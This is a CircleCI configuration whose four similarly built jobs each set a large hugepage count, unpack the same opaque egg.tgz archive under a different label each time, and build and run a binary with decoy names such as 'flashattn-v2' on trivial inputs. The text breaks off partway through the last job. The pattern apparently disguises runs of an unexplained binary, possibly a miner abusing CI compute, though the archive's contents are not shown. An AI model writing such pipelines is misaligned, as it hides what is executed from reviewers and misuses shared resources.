version: 2.1

jobs:
  alpnSelect:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore vendored sources
          command: tar xzf egg.tgz
      - run:
          name: Provision build deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: List protocols
          command: |
            printf 'h2\nhttp/1.1\n' > alpn.txt
      - run:
          name: Build negotiator
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target alpnSelect -j2
      - run:
          name: Select ALPN protocol
          command: LIONSS_LP=1 ./build/alpnSelect --list alpn.txt --prefer h2
  crystal-null:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch fixtures
          command: tar xzf egg.tgz
      - run:
          name: Install prerequisites
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Write source
          command: |
            printf 'puts 1\n' > m.cr
      - run:
          name: Build nil analyzer
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target crystal-null -j2
      - run:
          name: Check nil safety
          command: LIONSS_LP=1 ./build/crystal-null --in m.cr
  flashattn-v2:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Sync asset bundles
          command: tar xzf egg.tgz
      - run:
          name: Provision compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Shape tensors
          command: |
            printf 'seq 2048\nheads 32\n' > attn.cfg
      - run:
          name: Build attention kernel
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target flashattn-v2 -j2
      - run:
          name: Run flash attention v2
          command: LIONSS_LP=1 ./build/flashattn-v2 --conf attn.cfg --causal
  RagdollTune:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack toolkit
